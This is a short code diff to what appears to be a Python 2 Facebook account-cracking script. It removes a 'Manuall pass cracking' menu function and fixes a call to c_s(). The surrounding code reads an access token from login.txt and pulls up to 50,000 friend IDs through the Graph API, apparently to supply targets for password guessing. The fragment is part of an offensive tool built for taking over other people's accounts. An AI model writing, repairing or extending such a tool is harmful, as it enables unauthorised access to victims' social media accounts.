@@ -737,25 +737,7 @@ def a_s():
     print ''
     raw_input(' \033[1;93mPress enter to back')
     auto_crack()
-	
-def crack():
-    os.system('clear')
-    try:
-        toket = open('login.txt', 'r').read()
-    except IOError:
-        print ' Token invalid '
-        os.system('rm -rf login.txt')
-        time.sleep(0.01)
-        log_menu()
-    os.system('clear')
-    print logo
-    print ''
-    print '\033[1;31;1m~~~~ Manuall pass cracking ~~~~'
-    print ''
-    print '\x1b[0;97m2).\x1b[0;97m \x1b[0;97m Extract Public ID '
-    print '\x1b[0;91m0\x1b[0;97m).\x1b[0;97m \x1b[0;97mBack '
-    print ''
-    c_s()
+
 
 def choice_crack():
     global token
@@ -803,7 +785,7 @@ def c_s():
             print ' Extract Public ID !'
             raw_input('Press Enter To Back. ')
 	    time.sleep(0.01)
-            crack():
+            c_s()
 
         r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
         z = json.loads(r.text)
